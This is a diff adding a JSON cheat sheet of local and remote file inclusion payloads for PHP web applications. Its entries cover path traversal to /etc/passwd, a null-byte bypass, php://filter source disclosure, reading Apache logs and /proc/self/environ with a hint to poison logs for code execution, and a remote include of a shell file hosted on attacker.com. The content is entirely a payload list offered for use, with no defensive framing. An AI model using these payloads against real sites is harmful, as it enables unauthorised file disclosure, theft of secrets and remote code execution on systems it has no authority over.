@@ -1,0 +1,30 @@
+{
+  "category": "Web – LFI / RFI",
+  "description": "Include & read arbitrary files, plus php://filter tricks",
+  "cheats": [
+    {
+      "title": "Simple traversal",
+      "content": "/../../../../etc/passwd"
+    },
+    {
+      "title": "Null-byte bypass (older PHP)",
+      "content": "/etc/passwd%00"
+    },
+    {
+      "title": "php://filter base64 source disclosure",
+      "content": "php://filter/convert.base64-encode/resource=index.php"
+    },
+    {
+      "title": "Access Apache logs (then poison for RCE)",
+      "content": "../../../../var/log/apache2/access.log"
+    },
+    {
+      "title": "/proc/self/environ trick",
+      "content": "../../../../proc/self/environ"
+    },
+    {
+      "title": "Remote file include (if allow_url_include=1)",
+      "content": "http://attacker.com/shell.txt?"
+    }
+  ]
+}
